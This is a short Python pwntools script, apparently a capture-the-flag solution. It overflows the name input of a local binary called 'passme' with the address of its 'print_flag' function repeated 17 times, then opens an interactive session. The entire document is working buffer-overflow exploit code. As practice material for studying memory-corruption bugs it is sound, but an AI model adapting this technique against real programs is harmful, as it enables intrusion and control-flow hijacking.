from pwn import *
exe = ELF("./passme", checksec = False)

p = process(exe.path)
payload = p32(exe.sym['print_flag']) *  17
p.sendafter(b'name: \n', payload)

p.interactive()